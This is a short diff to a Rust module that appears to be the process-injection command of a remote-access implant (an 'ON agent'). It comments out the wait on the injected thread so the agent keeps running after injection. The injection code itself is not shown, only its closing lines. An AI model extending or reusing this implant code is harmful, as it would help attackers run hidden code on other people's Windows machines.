@@ -254,15 +254,17 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     }
 
                     // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
-                    logger.debug("Calling WaitForSingleObject...".to_string());
+                    // I do not know if this will have side effects, but if you omit the WaitForSingleObject call, the ON agent can continue to function after the thread injection takes place.
+                    
+                    //logger.debug("Calling WaitForSingleObject...".to_string());
 
-                    let status = WaitForSingleObject(h_thread, winbase::INFINITE);
-                    if status == 0 {
-                        logger.info("Good!".to_string())
-                    } else {
-                        let error = errhandlingapi::GetLastError();
-                        logger.err(format!("{error}"));
-                    }
+                    //let status = WaitForSingleObject(h_thread, winbase::INFINITE);
+                    //if status == 0 {
+                    //    logger.info("Good!".to_string())
+                    //} else {
+                    //    let error = errhandlingapi::GetLastError();
+                    //    logger.err(format!("{error}"));
+                    //}
                 }
 
                 return Ok("Injection completed!".to_string());
